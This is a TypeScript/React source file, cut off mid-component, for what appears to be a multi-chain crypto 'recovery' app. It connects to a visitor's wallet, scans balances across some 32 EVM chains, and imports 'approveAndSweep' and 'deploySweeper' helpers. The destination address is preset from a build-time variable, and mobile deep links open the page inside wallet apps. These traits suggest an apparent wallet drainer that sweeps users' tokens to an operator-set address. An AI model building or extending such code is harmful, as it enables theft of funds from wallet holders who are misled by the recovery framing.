import React, { useEffect, useMemo, useRef, useState } from 'react';
import { createRoot } from 'react-dom/client';
import { BrowserProvider, JsonRpcProvider, Contract, formatUnits, isAddress } from 'ethers';
import { EthereumProvider } from '@walletconnect/ethereum-provider';
import './styles.css';
import { deploySweeper, loadSweeperAddress, saveSweeperAddress, approveAndSweep } from './sweeper';
import AllAssetsReview from './AllAssetsReview';

declare global { interface Window { ethereum?: any } }

const chains = [
  { id: 1, name: 'Ethereum', native: 'ETH', explorer: 'https://etherscan.io/tx/', tokenApi: 'https://eth.blockscout.com/api/v2', rpcUrl: 'https://eth.llamarpc.com' },
  { id: 56, name: 'BNB Smart Chain', native: 'BNB', explorer: 'https://bscscan.com/tx/', tokenApi: 'https://bsc.blockscout.com/api/v2', rpcUrl: 'https://bsc-dataseed.binance.org' },
  { id: 137, name: 'Polygon', native: 'POL', explorer: 'https://polygonscan.com/tx/', tokenApi: 'https://polygon.blockscout.com/api/v2', rpcUrl: 'https://polygon-rpc.com' },
  { id: 8453, name: 'Base', native: 'ETH', explorer: 'https://basescan.org/tx/', tokenApi: 'https://base.blockscout.com/api/v2', rpcUrl: 'https://mainnet.base.org' },
  { id: 42161, name: 'Arbitrum One', native: 'ETH', explorer: 'https://arbiscan.io/tx/', tokenApi: 'https://arbitrum.blockscout.com/api/v2', rpcUrl: 'https://arbitrum-one.publicnode.com' },
  { id: 10, name: 'OP Mainnet', native: 'ETH', explorer: 'https://optimistic.etherscan.io/tx/', tokenApi: 'https://optimism.blockscout.com/api/v2', rpcUrl: 'https://optimism.llamarpc.com' },
  { id: 43114, name: 'Avalanche C-Chain', native: 'AVAX', explorer: 'https://snowscan.xyz/tx/', tokenApi: 'https://avalanche.blockscout.com/api/v2', rpcUrl: 'https://avalanche-c-chain-rpc.publicnode.com' },
  { id: 100, name: 'Gnosis', native: 'xDAI', explorer: 'https://gnosisscan.io/tx/', tokenApi: 'https://gnosis.blockscout.com/api/v2', rpcUrl: 'https://rpc.gnosischain.com' },
  { id: 59144, name: 'Linea', native: 'ETH', explorer: 'https://lineascan.build/tx/', tokenApi: 'https://linea.blockscout.com/api/v2', rpcUrl: 'https://rpc.linea.build' },
  { id: 81457, name: 'Blast', native: 'ETH', explorer: 'https://blastscan.io/tx/', tokenApi: 'https://blast.blockscout.com/api/v2', rpcUrl: 'https://rpc.blast.io' },
  { id: 5000, name: 'Mantle', native: 'MNT', explorer: 'https://mantlescan.xyz/tx/', rpcUrl: 'https://rpc.mantle.xyz' },
  { id: 204, name: 'opBNB', native: 'BNB', explorer: 'https://opbnbscan.com/tx/', rpcUrl: 'https://opbnb-mainnet-rpc.bnbchain.org' },
  { id: 167000, name: 'Taiko', native: 'ETH', explorer: 'https://taikoscan.io/tx/', tokenApi: 'https://blockscout.mainnet.taiko.xyz/api/v2', rpcUrl: 'https://rpc.mainnet.taiko.xyz' },
  { id: 324, name: 'zkSync Era', native: 'ETH', explorer: 'https://era.zksync.network/tx/', tokenApi: 'https://zksync.blockscout.com/api/v2', rpcUrl: 'https://mainnet.era.zksync.io' },
  { id: 534352, name: 'Scroll', native: 'ETH', explorer: 'https://scrollscan.com/tx/', tokenApi: 'https://scroll.blockscout.com/api/v2', rpcUrl: 'https://rpc.scroll.io' },
  { id: 42220, name: 'Celo', native: 'CELO', explorer: 'https://celoscan.io/tx/', tokenApi: 'https://celo.blockscout.com/api/v2', rpcUrl: 'https://forno.celo.org' },
  { id: 252, name: 'Fraxtal', native: 'frxETH', explorer: 'https://fraxscan.com/tx/', rpcUrl: 'https://rpc.frax.com' },
  { id: 199, name: 'BitTorrent', native: 'BTT', explorer: 'https://bttcscan.com/tx/', rpcUrl: 'https://rpc.bt.io' },
  { id: 50, name: 'XDC', native: 'XDC', explorer: 'https://xdcscan.com/tx/', rpcUrl: 'https://rpc.xdcrpc.com' },
  { id: 33139, name: 'ApeChain', native: 'APE', explorer: 'https://apescan.io/tx/', rpcUrl: 'https://rpc.apechain.com' },
  { id: 480, name: 'World Chain', native: 'ETH', explorer: 'https://worldscan.org/tx/', rpcUrl: 'https://worldchain-mainnet.g.alchemy.com/public' },
  { id: 146, name: 'Sonic', native: 'S', explorer: 'https://sonicscan.org/tx/', rpcUrl: 'https://rpc.soniclabs.com' },
  { id: 130, name: 'Unichain', native: 'ETH', explorer: 'https://uniscan.xyz/tx/', tokenApi: 'https://unichain.blockscout.com/api/v2', rpcUrl: 'https://mainnet.unichain.org' },
  { id: 2741, name: 'Abstract', native: 'ETH', explorer: 'https://abscan.org/tx/', rpcUrl: 'https://api.mainnet.abs.xyz' },
  { id: 80094, name: 'Berachain', native: 'BERA', explorer: 'https://berascan.com/tx/', rpcUrl: 'https://rpc.berachain.com' },
  { id: 143, name: 'Monad', native: 'MON', explorer: 'https://monadscan.com/tx/', rpcUrl: 'https://monad-rpc.publicnode.com' },
  { id: 999, name: 'HyperEVM', native: 'HYPE', explorer: 'https://hyperevmscan.io/tx/', rpcUrl: 'https://rpc.hyperliquid.xyz/evm' },
  { id: 747474, name: 'Katana', native: 'ETH', explorer: 'https://katanascan.com/tx/', rpcUrl: 'https://rpc.katana.network' },
  { id: 1329, name: 'Sei', native: 'SEI', explorer: 'https://seiscan.io/tx/', rpcUrl: 'https://evm-rpc.sei-apis.com' },
  { id: 9745, name: 'Plasma', native: 'XPL', explorer: 'https://plasmascan.to/tx/', rpcUrl: 'https://rpc.plasma.to' },
  { id: 1868, name: 'Soneium', native: 'ETH', explorer: 'https://soneium.blockscout.com/tx/', tokenApi: 'https://soneium.blockscout.com/api/v2', rpcUrl: 'https://rpc.soneium.org' },
  { id: 1284, name: 'Moonbeam', native: 'GLMR', explorer: 'https://moonscan.io/tx/', rpcUrl: 'https://rpc.api.moonbeam.network' },
];

const ALL_CHAIN_IDS = chains.map(c => c.id) as [number, ...number[]];
const RPC_MAP: Record<string, string> = Object.fromEntries(chains.filter(c => c.rpcUrl).map(c => [String(c.id), c.rpcUrl as string]));
const CHAIN_METHODS = ['eth_sendTransaction','eth_signTransaction','eth_sign','personal_sign','eth_signTypedData','eth_signTypedData_v4','wallet_switchEthereumChain','wallet_addEthereumChain','wallet_getCapabilities'] as const;

type WalletApp = 'metamask' | 'trust' | 'coinbase';
type WalletConnectProvider = Awaited<ReturnType<typeof EthereumProvider.init>>;
type TokenAsset = { chainId: number; chainName: string; address: string; name: string; symbol: string; decimals: number; balance: string; kind: 'native' | 'erc20' };

const ERC20_ABI = ['function balanceOf(address) view returns (uint256)','function transfer(address to, uint256 amount) returns (bool)'] as const;
const RECOVERY_DESTINATION = ((import.meta as any).env?.VITE_RECOVERY_DESTINATION as string | undefined)?.trim() || '';
let walletConnectProvider: WalletConnectProvider | null = null;

const walletName = (app: WalletApp) => app === 'metamask' ? 'MetaMask' : app === 'trust' ? 'Trust Wallet' : 'Coinbase Wallet';
const isMobileBrowser = () => /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
function walletLink(app: WalletApp) {
  const url = encodeURIComponent(window.location.href);
  const path = `${window.location.host}${window.location.pathname}${window.location.search}`;
  return { metamask: `https://metamask.app.link/dapp/${path}`, trust: `https://link.trustwallet.com/open_url?url=${url}`, coinbase: `https://go.cb-w.com/dapp?cb_url=${url}` }[app];
}

function parseChainId(value: unknown): number {
  if (typeof value === 'number' && Number.isFinite(value)) return value;
  const raw = String(value ?? '').trim();
  if (!raw) return NaN;
  if (raw.startsWith('0x') || raw.startsWith('0X')) return parseInt(raw, 16);
  return Number(raw);
}

function pushToken(found: TokenAsset[], chain: typeof chains[number], item: any) {
  const token = item?.token ?? item;
  const value = item?.value ?? item?.balance ?? token?.value;
  const tokenAddr = token?.address_hash || token?.address;
  if (!tokenAddr || value === undefined || value === null || String(value) === '0') return;
  const type = String(token?.type || item?.token_type || 'ERC-20').toUpperCase().replace('_', '-');
  if (type && type !== 'ERC-20' && type !== 'ERC20') return;
  const decimals = Number(token.decimals ?? 18);
  let balance = String(value);
  try { balance = formatUnits(value, decimals); } catch {}
  found.push({
    chainId: chain.id,
    chainName: chain.name,
    address: String(tokenAddr),
    name: token.name || 'Unknown token',
    symbol: token.symbol || 'TOKEN',
    decimals,
    balance,
    kind: 'erc20',
  });
}

async function fetchJson(url: string) {
  const response = await fetch(url);
  if (!response.ok) throw new Error(`indexer ${response.status}`);
  return response.json();
}

async function discoverTokens(chain: typeof chains[number], address: string): Promise<TokenAsset[]> {
  if (!chain.tokenApi) return [];
  const found: TokenAsset[] = [];
  try {
    const payload = await fetchJson(`${chain.tokenApi}/addresses/${address}/token-balances`);
    const list = Array.isArray(payload) ? payload : (payload?.items ?? []);
    for (const item of list) pushToken(found, chain, item);
  } catch {}
  if (found.length) return found;
  let next: string | null = `${chain.tokenApi}/addresses/${address}/tokens?type=ERC-20`;
  let pages = 0;
  while (next && pages < 20) {
    const payload = await fetchJson(next) as { items?: any[]; next_page_params?: Record<string, string | number> | null };
    const list = Array.isArray(payload) ? payload : (payload.items ?? []);
    for (const item of list) pushToken(found, chain, item);
    const params = !Array.isArray(payload) ? payload.next_page_params : null;
    next = params ? `${chain.tokenApi}/addresses/${address}/tokens?${new URLSearchParams(Object.entries(params).map(([k, v]) => [k, String(v)]))}` : null;
    pages += 1;
  }
  return found;
}

async function discoverNativeAsset(chain: typeof chains[number], address: string): Promise<TokenAsset | null> {
  if (!chain.rpcUrl) throw new Error(`${chain.name} missing RPC`);
  const provider = new JsonRpcProvider(chain.rpcUrl, chain.id, { staticNetwork: true });
  const rawBalance = await provider.getBalance(address);
  if (rawBalance <= 0n) return null;
  return { chainId: chain.id, chainName: chain.name, address: 'native', name: chain.native, symbol: chain.native, decimals: 18, balance: formatUnits(rawBalance, 18), kind: 'native' };
}

function App() {
  const [address, setAddress] = useState('');
  const [destination, setDestination] = useState(() => (RECOVERY_DESTINATION && isAddress(RECOVERY_DESTINATION) ? RECOVERY_DESTINATION : ''));
  const [connectedChain, setConnectedChain] = useState<number | null>(null);
  const [selectedChain, setSelectedChain] = useState<number | null>(null);
  const [focusChain, setFocusChain] = useState<number | null>(null);
  const [status, setStatus] = useState('Connect your wallet to begin.');
  const [txHash, setTxHash] = useState('');
  const [busy, setBusy] = useState(false);
  const [tokens, setTokens] = useState<TokenAsset[]>([]);
  const [scanning, setScanning] = useState(false);
  const [handoffApp, setHandoffApp] = useState<WalletApp | null>(null);
  const [handoffPending, setHandoffPending] = useState(false);
  const timer = useRef<number | null>(null);
  const mobile = isMobileBrowser();
  const chainInfo = useMemo(() => chains.find(c => c.id === (connectedChain ?? selectedChain)), [selectedChain, connectedChain]);
  const chainsWithAssets = useMemo(() => {
    const ids = new Set(tokens.map(t => Number(t.chainId)));
    return chains.filter(c => ids.has(c.id));
  }, [tokens]);
  const focusedFunded = useMemo(() => {
    if (!chainsWithAssets.length) return null;
    return chainsWithAssets.find(c => c.id === focusChain) ?? chainsWithAssets[0];
  }, [chainsWithAssets, focusChain]);

  useEffect(() => () => { if (timer.current !== null) window.clearTimeout(timer.current); }, []);

  async function switchToChainId(eip1193: any, chainId: number) {
    const target = chains.find(c => c.id === chainId);
    if (!target) throw new Error(`Unknown chain ${chainId}`);
    const hexId = `0x${chainId.toString(16)}`;
    try {
      await eip1193.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: hexId }] });
    } catch (e: any) {
      const code = e?.code ?? e?.data?.originalError?.code;
      const msg = String(e?.message || '').toLowerCase();
      if (target.rpcUrl && (code === 4902 || code === -32602 || code === 5000 || msg.includes('unrecognized') || msg.includes('not added'))) {
        await eip1193.request({ method: 'wallet_addEthereumChain', params: [{ chainId: hexId, chainName: target.name, nativeCurrency: { name: target.native, symbol: target.native, decimals: 18 }, rpcUrls: [target.rpcUrl], blockExplorerUrls: target.explorer ? [target.explorer.replace(/\\/tx\\/?$/, '/')] : [] }] });
        try { await eip1193.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: hexId }] }); } catch {}
      } else if (code === 4001) throw new Error('Network switch rejected');
      else throw e;
    }
    let actual = -1;
    for (let i = 0; i < 8; i++) {
      try { actual = parseChainId(await eip1193.request({ method: 'eth_chainId' })); if (actual === chainId) break; } catch {}
      await new Promise(r => setTimeout(r, 350));
    }
    setConnectedChain(actual > 0 ? actual : chainId);
    setSelectedChain(actual > 0 ? actual : chainId);
    if (actual !== chainId && actual > 0) throw new Error(`Wallet on ${actual}, need ${target.name}`);
  }
